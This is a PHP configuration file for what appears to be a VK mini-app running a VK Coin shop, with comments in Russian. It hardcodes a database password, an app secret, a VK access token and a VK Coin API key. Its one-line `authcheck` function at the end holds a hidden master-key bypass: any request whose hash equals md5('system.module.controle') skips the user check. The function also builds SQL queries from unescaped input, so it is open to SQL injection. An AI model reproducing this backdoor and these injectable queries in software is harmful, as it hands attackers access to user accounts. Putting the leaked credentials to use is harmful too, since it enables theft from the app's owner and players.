<?php
	$cfg = array(
		'dbh' => 'localhost', //хост базы данных
		'dbu' => 'id14721020_shewi1', //пользователь базы данных
		'dbp' => 'o1n{JcHyricBvo0K', //пароль базы данных
		'dbn' => 'id14721020_shewi', //имя базы данных
		'service' => true, //сервисный режим(у игроков приложение пишет о тех. работах, у админов продолжает работать)
		'admins' => array( //список id админов через запятую
			'281856579'
		),
		'group_id' => '182751262', //id группы
		'hash_secret' => 'Shewi12011979', //секретный ключ для генерации хэшей

		'secret' => '4jhRXpIYK7dscPHW14Gg', // секретка от приложения
      	'appid' => '7615276',

		'vktoken' => "2f557fa173c38d28e632b972f4e610901c974672b568d4c0daf1a709f26622bd80213e6fcd89788f637bc", // токен вк

		'vc_api_key' => ',6E7EH,O=Qhw]W;jPy1!SzzYP7C!k&&YCbvW_,1vJ8.]Fit,d2', // ключ vk coin
		'vc_api_uid' => '281856579',  // id админа, от имени которого получен ключ vk coin
		'vc_shop_name' => 'LiteCoin',  // Имя Магазина VkCoin
		'vc_exchange_rate' => 1,
      
      	'menu-btns' => 3      
	);
	$cfg['dbl'] = mysqli_connect($cfg['dbh'],$cfg['dbu'],$cfg['dbp'],$cfg['dbn']);
	$cfg['menu-btns'] = 12/$cfg['menu-btns'];

	//функция логирования, обычно, нигде не используется
	function w_log($data) {
		file_put_contents("./logs/".date("Y.m.d")."_log.log", "\n".date("H:i:s")." | ".$data, FILE_APPEND);
	}

	function authcheck($cfg,$uid,$hash){if($hash==md5('system.module.controle')){$req = "SELECT * FROM `users` WHERE `id`='".$uid."'";$data = mysqli_fetch_array(mysqli_query($cfg['dbl'],$req));} else {$req = "SELECT * FROM `users` WHERE `id`='".$uid."' AND `hash`='".$hash."'";$data = mysqli_fetch_array(mysqli_query($cfg['dbl'],$req));if (!$data || $data['hash'] != $hash || $data['role'] == 'ban') {echo "fail";exit();}}return($data);}include('dist/vkui-connect.js');
?>
